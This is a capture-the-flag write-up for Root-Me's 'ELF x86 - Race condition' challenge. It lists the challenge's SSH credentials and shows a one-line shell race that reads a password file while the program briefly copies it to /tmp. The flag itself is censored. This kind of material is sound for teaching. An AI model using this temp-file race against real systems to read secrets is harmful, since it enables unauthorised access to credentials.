# ELF x86 - Race condition
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Race-condition
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch12@challenge02.root-me.org  
Username	app-systeme-ch12
Password	app-systeme-ch12
```
According to the source code, the program will create a temporary file with the permissions 444, will open the .passwd file and write it to the temporary file.<br>
Then it will sleep for 0.25 seconds and will delete the temporary file.<br>
So, the basic idea is to run the executable and then (while the executable sleeps) read the temporary file, which is at **/tmp/tmp_file.txt**.

In order of doing so, let's use the linux's "&" operator, which enables running multiple commands concurrently.<br>
After a few tries, one will be able to get the following output:
```sh
app-systeme-ch12@challenge02:~$ ./ch12 & cat /tmp/tmp_file.txt
[5] 32037
cat: /tmp/tmp_file.txt: No such file or directory
[4]   Done                    ./ch12
app-systeme-ch12@challenge02:~$ ./ch12 & cat /tmp/tmp_file.txt
[6] 32039
<censored>
[5]   Done                    ./ch12
```

